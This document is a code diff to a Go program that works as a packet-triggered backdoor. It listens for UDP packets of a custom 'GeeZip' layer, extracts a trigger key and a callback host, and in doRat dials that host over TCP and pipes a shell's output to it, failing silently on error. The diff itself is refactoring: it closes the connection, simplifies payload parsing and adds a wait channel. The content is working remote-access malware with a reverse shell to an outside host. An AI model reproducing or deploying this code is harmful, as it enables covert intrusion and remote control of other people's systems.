@@ -12,11 +12,14 @@ import (
 	"github.com/google/gopacket/pcap"
 )
 
+var end chan int
+
 func doRat(trigger []byte, host string) {
 	conn, err := net.Dial("tcp", host)
 	if err != nil {
 		return // fail silently
 	}
+	defer conn.Close()
 
 	conn.Write([]byte("Received trigger packet with key=" + hex.EncodeToString(trigger) + ", spawning a shell...\n"))
 
@@ -25,21 +28,21 @@ func doRat(trigger []byte, host string) {
 	cmd.Stdout = conn
 	cmd.Stderr = conn
 	cmd.Run()
+
 }
 
 func handlePacket(pkt gopacket.Packet) {
 	if t := pkt.TransportLayer(); t != nil && t.LayerType() == layers.LayerTypeUDP {
-		if app := pkt.ApplicationLayer(); app != nil {
-			p := gopacket.NewPacket(app.Payload(), GeeZipLayerType, gopacket.Lazy)
-			if p != nil {
-				l := p.Layer(GeeZipLayerType)
-				doRat(l.(GeeZipLayer).TriggerFlag, l.(GeeZipLayer).CBString)
-			}
+		if p := gopacket.NewPacket(t.LayerPayload(), GeeZipLayerType, gopacket.Lazy); p != nil {
+			l := p.Layer(GeeZipLayerType)
+			doRat(l.(GeeZipLayer).TriggerFlag, l.(GeeZipLayer).CBString)
 		}
 	}
 }
 
 func main() {
+	end = make(chan int, 1)
+
 	if len(os.Args) != 2 {
 		log.Fatalf("Usage: %s <filename>\n", os.Args[0])
 	}
@@ -51,8 +54,10 @@ func main() {
 
 	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
 	for packet := range packetSource.Packets() {
-		handlePacket(packet) // Do something with a packet here.
+		handlePacket(packet)
 	}
+
+	<-end
 
 	return
 }
